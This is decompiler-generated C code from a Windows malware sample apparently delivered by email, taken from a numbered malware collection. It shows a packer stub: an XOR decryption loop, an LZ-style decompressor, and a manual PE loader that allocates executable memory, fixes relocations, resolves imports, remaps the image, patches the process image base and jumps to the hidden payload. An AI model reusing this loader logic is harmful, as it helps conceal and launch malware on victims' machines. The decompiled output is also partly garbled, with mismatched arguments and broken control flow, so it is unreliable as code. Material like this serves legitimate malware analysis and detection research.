// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0856/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401060(Eq_316 * dwArg04, Eq_316 * dwArg08, Eq_306 dwArg0C)
{
	int32 dwLoc08_16 = 0x00000000;
	while (dwLoc08_16 < dwArg0C)
	{
		dwArg04[dwLoc08_16] = dwArg08[dwLoc08_16];
		dwLoc08_16 = dwLoc08_16 + 0x00000001;
	}
	return;
}

word32 * fn004010A0(word32 * ebp, word32 dwArg04, word32 dwArg08, up32 dwArg0C)
{
	if (RegOpenKeyA(0x80000002, 0x00408070, fp - 0x00000020) == 0x00000000)
		;
	else
	{
		byte dl_57 = *dwArg04;
		up32 dwLoc0C_115 = 0x00000001;
		word32 dwLoc18_113 = 0x00000000;
		do
		{
			up32 edx_76 = dwLoc0C_115 + 0x00000001;
			byte cl_73 = dwArg04[dwLoc0C_115];
			dwLoc0C_115 = edx_76;
			if ((word32) cl_73 != (word32) dl_57)
			{
				dwArg08[dwLoc18_113] = cl_73;
				dwLoc18_113 = dwLoc18_113 + 0x00000001;
			}
			else if ((word32) dwArg04[edx_76] == 0x00000000)
			{
				dwArg08[dwLoc18_113] = dl_57;
				dwLoc18_113 = dwLoc18_113 + 0x00000001;
				dwLoc0C_115 = edx_76 + 0x00000001;
			}
			else
			{
				word32 eax_142 = fn004011D0(fp - 0x00000010, dwArg04 + edx_76) + edx_76;
				dwLoc0C_115 = fn004011D0(fp - 0x00000024, dwArg04 + eax_142) + eax_142;
				up32 dwLoc1C_159 = 0x00000000;
				while (dwLoc1C_159 <u dwLoc10)
				{
					dwArg08[dwLoc18_113] = dwArg08[dwLoc18_113 - dwLoc24];
					dwLoc18_113 = dwLoc18_113 + 0x00000001;
					dwLoc1C_159 = dwLoc1C_159 + 0x00000001;
				}
			}
		} while (dwLoc0C_115 <u dwArg0C);
	}
}

word32 fn004011D0(word32 dwArg04, word32 dwArg08)
{
	LoadIconA(0x00000000, 0x00007F00);
	word32 dwLoc08_15 = 0x00000000;
	word32 dwLoc10_16 = 0x00000000;
	do
	{
		word32 ecx_23 = (word32) dwArg08->b0000;
		word32 eax_32 = dwLoc08_15 << 0x00000007 | ecx_23 & 0x0000007F;
		word32 edx_35 = dwLoc10_16 + 0x00000001;
		dwArg08 = dwArg08 + 1;
		dwLoc08_15 = eax_32;
		dwLoc10_16 = edx_35;
	} while ((ecx_23 & 0x00000080) != 0x00000000);
	*dwArg04 = eax_32;
	return edx_35;
}

void fn00401300(word32 ebx, word32 ebp, word32 esi, word32 edi, Eq_223 * fs)
{
	COMCTL32.dll!Ordinal_17();
	LoadCursorA(0x00000000, 0x00007F00);
	GetCommandLineA();
	Eq_145 eax_27 = GetModuleHandleA(0x00000000);
	up32 dwLoc08_104 = 0x00000000;
	if (RegOpenKeyA(0x80000002, 0x004080A8, fp - 0x00000028) != 0x00000000)
	{
		fp->dwFFFFFFF8 = 0x00401280;
		fp->dwFFFFFFF8 = 0x00000000;
		DialogBoxParamA(eax_27, 0x000003E8, 0x80000002, 0x004080A8, 0x00000000);
		return;
	}
	else
	{
		up32 eax_97 = globals->dw404000;
		word32 edx_100 = globals->dw404004;
		fp->dwFFFFFFF8 = 0x00000000;
		while (dwLoc08_104 <u eax_97)
		{
			(dwLoc08_104 + 0x00404000)->dw0008 = (dwLoc08_104 + 0x00404000)->dw0008 ^ 0x00891100;
			dwLoc08_104 = dwLoc08_104 + 0x00000008;
		}
		globals->dw4080D4 = fn00401960(edx_100);
		fp->dwFFFFFFF8 = globals->dw4080D4;
		fp->dwFFFFFFF8 = 0x00404008;
		Eq_208 * ebp_138 = fn004010A0(fp - 0x00000004, 0x80000002, 0x004080A8, eax_97);
		ebp_138->ptrFFFFFFFC = 0x00401435;
		globals->ptr4080D8 = fs->ptr0018;
		ebp_138->ptrFFFFFFFC = 0x00000000;
		globals->dw4080C8 = edi;
		globals->dw4080C4 = esi;
		globals->dw4080D0 = ebx;
		globals->ptr4080CC = ebp_138;
		word32 eax_150 = ebp_138->ptrFFFFFFFC;
		fp->dwFFFFFFF8 = eax_150;
		word32 ecx_154 = ebp_138->ptrFFFFFFFC - ebp_138->ptrFFFFFFFC;
		fp->dwFFFFFFF8 = ecx_154;
		fn00401480(dwArg00, dwArg04);
		word32 edx_162 = globals->dw4080D4;
		fp->dwFFFFFFF8 = edx_162;
		fn004015F0(dwArg00);
		ebp_138->ptrFFFFFFFC = 0x00000000;
		Mem165[0x004080DC:word32]();
		return;
	}
}

void fn00401480(word32 dwArg04, word32 dwArg08)
{
fn00401480_entry:
l00401480:
	Eq_298 * edx_16 = dwArg08 + Mem0[dwArg08 + 0x0000003C:word32]
	globals->ptr4080C0 = VirtualAlloc(0x00000000, edx_16->t0050, 0x00003000, 0x00000040);
	branch globals->ptr4080C0 != null l004014C4
l004014BD:
	goto l004015C0
l004014C4:
	fp->tFFFFFFD4 = edx_16->t0050;
	Mem46[fp - 0x00000030:word32] = dwArg08
	fn00401060(globals->ptr4080C0, (Eq_316 *) 0x00003000, 0x00000040)
	word32 eax_52 = globals->ptr4080C0 - dwArg08
	branch edx_16->dw00A4 == 0x00000000 l004015A9
l004014F9:
	Eq_352 * dwLoc0C_147 = dwArg08 + Mem46[edx_16 + 0x000000A0:word32]
l00401508:
	branch dwLoc0C_147->dw0004 == 0x00000000 l004015A9
l00401515:
	uint32 eax_95 = dwLoc0C_147->dw0004 - 0x00000008 >>u 0x00000001
	word16 * ecx_98[] = &dwLoc0C_147->a0008[0]
	uint32 dwLoc08_101 = 0x00000000
	goto l0040153E
l00401535:
	dwLoc08_101 = dwLoc08_101 + 0x00000001;
l0040153E:
	branch dwLoc08_101 >=u eax_95 l00401598
l00401546:
	branch (word32) ecx_98[dwLoc08_101] >> 0x0000000C != 0x00000003 l00401596
l00401558:
	(Mem46[0x004080C0:word32] + Mem46[dwLoc0C_147 + 0x00000000:word32])[(word32) ecx_98[dwLoc08_101] & 0x00000FFF] = (Mem46[0x004080C0:word32] + Mem46[dwLoc0C_147 + 0x00000000:word32])[(word32) ecx_98[dwLoc08_101] & 0x00000FFF] + eax_52;
l00401596:
	goto l00401535
l00401598:
	dwLoc0C_147 = dwLoc0C_147 + Mem46[dwLoc0C_147 + 0x00000004:word32];
	goto l00401508
l004015A9:
l004015C0:
	return
fn00401480_exit:
}

word32 fn004015D0(word32 dwArg04, word32 dwArg08)
{
	word32 eax_14 = GetProcAddress(dwArg04, dwArg08);
	return eax_14;
}

void fn004015F0(word32 dwArg04)
{
	word32 edx_13 = dwArg04 + Mem0[dwArg04 + 0x0000003C:word32];
	Eq_434 * dwLoc20_119 = &edx_13->w0014 + (word32) edx_13->w0014;
	Eq_316 * eax_30 = VirtualAlloc(0x00000000, edx_13->t0050, 0x00003000, 0x00000040);
	if (eax_30 == null)
		;
	else
	{
		Mem82[fp - 0x00000044:word32] = Mem0[dwArg04 + 0x0000003C:word32] + 0x00000138 + (word32) Mem0[edx_13 + 0x00000006:word16] *s 0x00000028;
		Mem85[fp - 0x00000048:word32] = dwArg04;
		fn00401060(eax_30, (Eq_316 *) 0x00003000, 0x00000040);
		up32 dwLoc0C_123 = 0x00000000;
		while (dwLoc0C_123 <u (word32) edx_13->w0006)
		{
			if (dwLoc20_119->dw0014 != 0x00000000 && dwLoc20_119->dw0010 != 0x00000000)
			{
				word32 eax_131 = dwLoc20_119->dw0010 - 0x00000001 + edx_13->t003C;
				fn00401060(eax_30 + Mem85[dwLoc20_119 + 0x0000000C:word32], dwArg04 + Mem85[dwLoc20_119 + 0x00000014:word32], SEQ(SEQ(0x00000000, eax_131) % edx_13->t003C, eax_131) /u edx_13->t003C *s edx_13->t003C);
			}
			dwLoc20_119 = dwLoc20_119 + 1;
			dwLoc0C_123 = dwLoc0C_123 + 0x00000001;
		}
		Eq_483 * ecx_159 = eax_30 + Mem85[eax_30 + 0x0000003C:word32];
		Eq_306 eax_164 = ecx_159->t0050;
		fp->dwFFFFFFF0 = 0x00000004;
		Eq_496 eax_175 = CreateFileMappingA(0xFFFFFFFF, 0x00000000, 0x00000000, 0x00000000, eax_164, 0x00000000);
		if (eax_175 == 0x00000000)
			;
		else
		{
			Eq_560 * dwLoc40_187 = eax_30 + Mem170[ecx_159 + 0x00000080:word32];
			while (dwLoc40_187->dw0010 != 0x00000000)
			{
				Eq_603 * dwLoc2C_216;
				Eq_604 * dwLoc1C_215;
				word32 eax_209 = LoadLibraryA(eax_30 + Mem170[dwLoc40_187 + 0x0000000C:word32]);
				if (dwLoc40_187->dw0000 != 0x00000000)
				{
					dwLoc1C_215 = eax_30 + Mem170[dwLoc40_187 + 0x00000000:word32];
					dwLoc2C_216 = eax_30 + Mem170[dwLoc40_187 + 0x00000010:word32];
				}
				else
				{
					dwLoc1C_215 = eax_30 + Mem170[dwLoc40_187 + 0x00000010:word32];
					dwLoc2C_216 = eax_30 + Mem170[dwLoc40_187 + 0x00000000:word32];
				}
				if (dwLoc40_187->dw0010 != 0x00000000 && dwLoc40_187->dw0000 != 0x00000000)
				{
					fp->dwFFFFFFF0 = 0x00000001;
					goto l0040179D;
				}
l0040179D:
				while (dwLoc1C_215->dw0000 != 0x00000000)
				{
					if ((dwLoc1C_215->dw0000 & 0x80000000) != 0x00000000)
						dwLoc1C_215->dw0000 = fn004015D0(eax_209, dwLoc1C_215->dw0000 & 0x7FFFFFFF);
					else
						dwLoc1C_215->dw0000 = fn004015D0(eax_209, dwLoc1C_215->dw0000 + 0x00000002 + eax_30);
					if (dwLoc1C_215->dw0000 == 0x00000000)
						goto l0040192A;
					if (0x00000000 != 0x00000000)
						dwLoc2C_216->dw0000 = dwLoc1C_215->dw0000;
					dwLoc1C_215 = dwLoc1C_215 + 1;
					dwLoc2C_216 = dwLoc2C_216 + 1;
				}
				dwLoc40_187 = dwLoc40_187 + 1;
			}
			Eq_306 edx_324 = ecx_159->t0034;
			fp->dwFFFFFFF0 = 0x00000000;
			fp->dwFFFFFFF0 = 0x00000000;
			fp->dwFFFFFFF0 = 0x00000022;
			fp->dwFFFFFFF0 = eax_175.u0;
			globals->ptr4080C0 = MapViewOfFileEx(0xFFFFFFFF, 0x00000000, 0x00000004, 0x00000000, 0x00000000, edx_324);
			if (globals->ptr4080C0 != null)
				goto l004018E1;
			else if (UnmapViewOfFile(ecx_159->t0034) == 0x00000000)
			{
				fp->dwFFFFFFF0 = 0x00000000;
				Mem430[fp - 0x0000004C:word32] = Mem426[ecx_159 + 0x00000034:word32];
				if (VirtualFree(0x00000000, 0x00000000, 0x00008000) == 0x00000000)
					;
				else
				{
l0040188D:
					Eq_306 eax_384 = ecx_159->t0034;
					fp->dwFFFFFFF0 = 0x00000000;
					fp->dwFFFFFFF0 = 0x00000000;
					fp->dwFFFFFFF0 = 0x00000022;
					globals->ptr4080C0 = MapViewOfFileEx(eax_175, 0x00000022, 0x00000000, 0x00000000, 0x00000000, eax_384);
					if (globals->ptr4080C0 == null)
					{
						fp->dwFFFFFFF0 = 0x00003000;
						Mem410[fp - 0x0000004C:word32] = Mem406[ecx_159 + 0x00000050:word32];
						Mem414[fp - 0x00000050:word32] = Mem410[ecx_159 + 0x00000034:word32];
						globals->ptr4080C0 = VirtualAlloc(0x00000000, 0x00000000, null, 0x00000040);
						if (globals->ptr4080C0 == null)
							;
						else
						{
l004018E1:
							fn00401060(globals->ptr4080C0, eax_30, ecx_159->t0050);
							fn00401930(globals->ptr4080C0);
							Mem367[0x004080DC:word32] = Mem340[0x004080C0:word32] + Mem340[ecx_159 + 0x00000028:word32];
							ecx_159->ptr0028 = globals->ptr4080DC;
						}
					}
					else
						goto l004018E1;
				}
			}
			else
				goto l0040188D;
		}
	}
l0040192A:
	return;
}

void fn00401930(Eq_316 * dwArg04)
{
	Eq_225 * eax_11 = globals->ptr4080D8;
	eax_11->ptr0030->dw0008 = dwArg04;
	return;
}

word32 fn00401960(word32 dwArg04)
{
	return HeapAlloc(GetProcessHeap(), 0x00000000, dwArg04);
}

